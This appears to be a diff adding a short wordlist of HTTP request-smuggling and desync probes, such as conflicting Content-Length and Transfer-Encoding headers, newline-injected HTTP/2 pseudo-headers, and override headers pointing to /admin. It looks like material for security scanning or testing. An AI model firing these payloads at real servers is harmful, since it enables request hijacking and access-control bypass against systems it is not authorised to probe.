@@ -1,0 +1,11 @@
+# HTTP/2 and HTTP/3 desync probes as raw header fragments
+content-length: 0\r\ntransfer-encoding: chunked
+transfer-encoding: chunked\r\ncontent-length: 4
+Transfer-Encoding: chunked\r\nTransfer-Encoding: x
+Content-Length: 5\r\nContent-Length: 0
+te: trailers
+connection: keep-alive, transfer-encoding
+:method: POST\n:scheme: https\n:path: /
+x-http-method-override: POST
+x-original-url: /admin
+x-rewrite-url: /admin
